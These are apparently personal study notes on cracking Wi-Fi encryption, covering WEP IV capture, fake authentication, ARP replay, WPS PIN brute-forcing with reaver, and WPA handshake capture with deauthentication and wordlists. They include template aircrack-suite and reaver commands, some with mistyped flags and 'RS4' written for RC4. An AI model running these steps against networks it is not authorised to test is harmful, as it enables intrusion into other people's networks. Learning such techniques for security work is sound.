## WEP (Wired Equivalent Privacy) Cracking

-   Old encryption
-   Uses an algorithm called **RS4**

### Workflow

-   IV is too **small.**
-   IV is sent in **plain text.**
-   IVs will repeat on **busy networks.**
-   This makes WEP vulnerable to statistical attacks.

### Cracking

-   Capture a large number of of packets/IVs.
-   Analyse captured IVs and crack the key.

| `airodump-ng —bssid <bssid> —channel <channel> --write result <wlan interface>` | Capture packets of network → write it to a file for anaylising |
| ------------------------------------------------------------------------------- | -------------------------------------------------------------- |
| `aircrack-ng <xx.cap file>`                                                     | Crack the key by using captured packets                        |

### Fake Authentication

-   If network is not busy.
-   It would take some time to capture the IVs.

→ Force the AP to generate new IVs.

→ Associate with the AP before launching the attack.

| `aireplay-ng --fakeauth 0 -a <bssid network> -h <wireless adapter MAC> <wireless interface>` | Force the network to add wireless adapter to the client (not yet connected) |
| -------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- |

### ARP Request Replay

-   Wait for an ARP packet.
-   Capture it, and replay it (retransmit it).
-   This causes the AP to produce another packet with a **new IV**.
-   Keep doing this till we have enough IVs to crack the key.

| `aireplay-ng --arpreplay 0 -b <bssid network> -h <wireless adapter MAC> <wireless interface>` | Force network to create new IVs/packets. |
| --------------------------------------------------------------------------------------------- | ---------------------------------------- |

## WPA / WPA2 Cracking

-   Both can be cracked using the **same method.**
-   Made to address the issues in WEP.
-   Much more secure.
-   Each packet is encrypted using a unique temporary key.

→ Packets contain no useful information.

### WPS

-   WPS is a feature that can be used with WPA & WPA2.
-   Allows clients to connect without the password.
-   Authentication is done using a 8 digit pin.
    -   8 Digits is very small.
    -   We can try all possible pins in a relatively short time.
    -   Then the WPS pin can be used to compute the actual password.

_Note: This only works if the router is configured not to use PBC (Push Button Authentication)._

| `wash —-interface <wireless interface>`                                                                           | Scans nearby networks and **lists only those that have WPS enabled**               |
| ----------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| `reaver —-bssid <target router address> -—channel <channel> —-interface <wireless interface> -vvv —-no-associate` | Sends **WPS PIN guesses** to the router without associate (use fake auth manually) |

### Capturing The Handshake

Using `airodump-ng` write of a specific network and `aireplay-ng —-deauth` to capture the handshake

-   The handshake does not contain data that helps recover the key.
-   It contains data that can be used to check if a key is valid or not.

### Creating A WordList

-   Crunch can be used to create a wordlist.

### Cracking Using Wordlists

Two things needed to crack WPA/WPA2:

1. 4-Way Handshake
2. Wordlist
